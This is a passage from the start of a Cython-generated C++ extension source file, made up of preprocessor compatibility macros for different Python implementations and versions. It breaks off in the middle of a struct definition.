/* Generated by Cython 0.29.28 */

#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_28"
#define CYTHON_HEX_VERSION 0x001D1CF0
#define CYTHON_FUTURE_DIVISION 0
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030B00A1)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef __cplusplus
  #error "Cython files generated with the C++ option must be compiled with a C++ compiler."
#endif
#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #else
    #define CYTHON_INLINE inline
  #endif
#endif
template<typename T>
void __Pyx_call_destructor(T& x) {
    x.~T();
}
template<typename T>
class __Pyx_FakeReference {
  public:
    __Pyx_FakeReference() : ptr(NULL) { }
    __Pyx_FakeReference(const T& ref) : ptr(const_cast<T*>(&ref)) { }
    T *operator->() { return ptr; }
    T *operator&() { return ptr; }
    operator T&() { return *ptr; }
    template<typename U> bool operator ==(U other) { return *ptr == other; }
    template<typename U> bool operator !=(U other) { return *ptr != other; }
  private:
    T *ptr;
};

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if defined(PyUnicode_IS_READY)
  #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                              0 : _PyUnicode_Ready((PyObject *)(op)))
  #else
  #define __Pyx_PyUnicode_READY(op)       (0)
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if defined(PyUnicode_IS_READY) && defined(PyUnicode_GET_SIZE)
  #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
  #else
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
  #endif
  #else
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
